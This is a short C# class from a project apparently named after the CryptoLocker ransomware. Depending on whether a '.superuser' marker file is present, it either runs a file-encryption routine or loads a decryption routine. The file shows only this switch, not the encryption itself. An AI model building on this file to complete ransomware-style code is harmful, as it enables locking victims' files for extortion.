using CryptoLocker.Common;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CryptoLocker.Implements
{
    public class Configurator : ConfiguratorBase
    {
        private readonly DecryptConfigurator _decryptConfigurator;
        private readonly EncryptConfigurator _encryptConfigurator;

        public Configurator(EncryptConfigurator encryptConfigurator, DecryptConfigurator decryptConfigurator)
        {
            _encryptConfigurator = encryptConfigurator;
            _decryptConfigurator = decryptConfigurator;
        }

        public void Execute()
        {
            if (IsSuperuser())
            {
                _decryptConfigurator.Load();
            }
            else
            {
                _encryptConfigurator.Execute();
            }
        }

        private bool IsSuperuser()
        {
            var superuser = GetFilesPath().Where(w => w.Contains(".superuser")).FirstOrDefault();
            return superuser != null;
        }
    }
}
